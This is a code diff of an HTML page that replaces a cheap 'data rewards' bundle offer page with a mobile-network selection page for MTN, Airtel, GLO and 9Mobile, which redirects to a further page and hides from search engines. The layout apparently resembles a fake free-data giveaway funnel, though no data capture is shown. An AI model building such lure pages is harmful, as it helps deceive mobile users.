@@ -1,77 +1,138 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Data Rewards | Choose Bundle</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body { background-color: #f8fafc; font-family: 'Inter', sans-serif; }
-        .card-hover:active { transform: scale(0.98); }
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Select Your Network</title>
+  <meta name="robots" content="noindex,nofollow" />
+  <style>
+    *{box-sizing:border-box}
+    html,body{height:100%;margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial;
+      /* Background gradient for the overall page */
+      background: linear-gradient(135deg, #007bff, #00c6ff); 
+    }
+
+    /* Page Container Styles (acts as the main hero section) */
+    .page-container {
+      min-height:100vh;
+      display:flex; /* Display by default since it's the only page */
+      align-items:center; /* center vertically */
+      justify-content:center; /* center horizontally */
+      padding:20px;
+    }
+
+    /* --- Network Selection Box Styles --- */
+    .selection-box {
+      background: #1a2a4e; /* Dark blue background for the card */
+      border-radius: 20px;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+      padding: 30px;
+      max-width: 450px;
+      width: 100%;
+      text-align: center;
+      color: #fff;
+    }
+    .selection-box h2 {
+      font-size: 26px;
+      font-weight: bold;
+      color: #fedb70; /* Yellowish color for the heading */
+      margin-bottom: 30px;
+    }
+    .network-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr; /* Two columns */
+      gap: 20px; /* Space between buttons */
+    }
+    .network-button {
+      background: #fff;
+      border-radius: 15px;
+      padding: 20px 10px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-decoration: none;
+      color: #333;
+      font-weight: bold;
+      font-size: 16px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      cursor: pointer;
+    }
+    .network-button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 6px 15px rgba(0,0,0,0.15);
+    }
+    .network-button:active {
+        transform: translateY(0);
+        box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+    .network-button .logo-container { /* Renamed .dot to .logo-container */
+      width: 50px; /* Increased size to better fit logos */
+      height: 50px;
+      border-radius: 50%; /* Still round container */
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden; /* Ensures image stays within the circle */
+      background-color: #eee; /* Light background for logos that might not fill */
+    }
+    .network-button .logo-container img {
+        width: 100%;
+        height: 100%;
+        object-fit: contain; /* Ensures logo fits without cropping, maintains aspect ratio */
+        border-radius: 50%; /* Keep image round within the container */
+    }
+
+    /* Add subtle border for all network buttons (now around the whole button) */
+    .network-button.mtn { border: 2px solid #ffcc00; }
+    .network-button.airtel { border: 2px solid #ff0000; }
+    .network-button.glo { border: 2px solid #008000; }
+    .network-button.ninemobile { border: 2px solid #000000; }
+  </style>
+  <script>
+    // Function to handle the redirection
+    function redirectToPage3(networkName) {
+        // You could use the networkName here if you needed to pass it to the next page
+        console.log("Redirecting after selecting: " + networkName);
+        window.location.href = 'page3.html';
+    }
+  </script>
 </head>
-<body class="min-h-screen flex flex-col items-center p-4">
-
-    <header class="w-full max-w-md bg-blue-700 text-white rounded-2xl p-6 mb-8 shadow-xl relative overflow-hidden">
-        <div class="relative z-10">
-            <div class="flex justify-between items-center mb-4">
-                <h1 class="text-xl font-black italic tracking-wider">DATA BUNDLES</h1>
-                <span class="bg-red-500 text-[10px] font-mono px-2 py-1 rounded">LIVE OFFER</span>
-            </div>
-            <p class="text-blue-100 text-sm">Check your eligibility for exclusive bonus data packages.</p>
-        </div>
-        <div class="absolute -right-4 -bottom-4 w-24 h-24 bg-blue-600 rounded-full opacity-30"></div>
-    </header>
-
-    <main class="w-full max-w-md space-y-4">
-        
-        <a href="success.html" class="block bg-white border border-gray-200 rounded-2xl p-5 shadow-sm card-hover transition-all">
-            <div class="flex justify-between items-start mb-6">
-                <div>
-                    <h3 class="text-3xl font-black text-gray-800">5 GB</h3>
-                    <span class="text-blue-600 text-[10px] font-bold uppercase">Student Choice</span>
-                </div>
-                <span class="bg-blue-100 text-blue-700 text-[10px] font-bold px-2 py-1 rounded">BEST VALUE</span>
-            </div>
-            <div class="flex justify-between items-center border-t border-gray-100 pt-4">
-                <span class="text-gray-400 text-xs font-medium">30 Days Validity</span>
-                <span class="text-2xl font-bold text-gray-900">₦100</span>
-            </div>
+<body>
+  
+  <div class="page-container">
+    <div class="selection-box">
+      <h2>Select Your Network</h2>
+      <div class="network-grid">
+        <a href="javascript:void(0);" class="network-button mtn" onclick="redirectToPage3('MTN');">
+          <div class="logo-container">
+            <img src="https://i.postimg.cc/KjC3gQP2/download-1.png" alt="MTN Logo" />
+          </div>
+          <span>MTN</span>
         </a>
-
-        <a href="success.html" class="block bg-white border-2 border-blue-600 rounded-2xl p-5 shadow-md card-hover transition-all">
-            <div class="flex justify-between items-start mb-6">
-                <div>
-                    <h3 class="text-3xl font-black text-gray-800">10 GB</h3>
-                    <span class="text-blue-600 text-[10px] font-bold uppercase">Premium Deal</span>
-                </div>
-                <span class="bg-blue-600 text-white text-[10px] font-bold px-2 py-1 rounded">MOST POPULAR</span>
-            </div>
-            <div class="flex justify-between items-center border-t border-gray-100 pt-4">
-                <span class="text-gray-400 text-xs font-medium">30 Days Validity</span>
-                <span class="text-2xl font-bold text-gray-900">₦150</span>
-            </div>
+        <a href="javascript:void(0);" class="network-button airtel" onclick="redirectToPage3('AIRTEL');">
+          <div class="logo-container">
+            <img src="https://i.postimg.cc/76xWpnJd/images-2.png" alt="Airtel Logo" />
+          </div>
+          <span>AIRTEL</span>
         </a>
-
-        <a href="success.html" class="block bg-white border border-gray-200 rounded-2xl p-5 shadow-sm card-hover transition-all">
-            <div class="flex justify-between items-start mb-6">
-                <div>
-                    <h3 class="text-3xl font-black text-gray-800">20 GB</h3>
-                    <span class="text-blue-600 text-[10px] font-bold uppercase">Family Choice</span>
-                </div>
-                <span class="bg-gray-100 text-gray-600 text-[10px] font-bold px-2 py-1 rounded">BIG SAVINGS</span>
-            </div>
-            <div class="flex justify-between items-center border-t border-gray-100 pt-4">
-                <span class="text-gray-400 text-xs font-medium">30 Days Validity</span>
-                <span class="text-2xl font-bold text-gray-900">₦200</span>
-            </div>
+        <a href="javascript:void(0);" class="network-button glo" onclick="redirectToPage3('GLO');">
+          <div class="logo-container">
+            <img src="https://i.postimg.cc/ZqDwMzZh/images-2-17.jpg" alt="GLO Logo" />
+          </div>
+          <span>GLO</span>
         </a>
-
-    </main>
-
-    <footer class="mt-10 text-[10px] text-gray-400 text-center max-w-xs">
-        Data rewards are subject to network availability and user eligibility status.
-    </footer>
-
+        <a href="javascript:void(0);" class="network-button ninemobile" onclick="redirectToPage3('9MOBILE');">
+          <div class="logo-container">
+            <img src="https://i.postimg.cc/FHTpYXfX/images-2-20.jpg" alt="9Mobile Logo" />
+          </div>
+          <span>9MOBILE</span>
+        </a>
+      </div>
+    </div>
+  </div>
+  
 </body>
 </html>
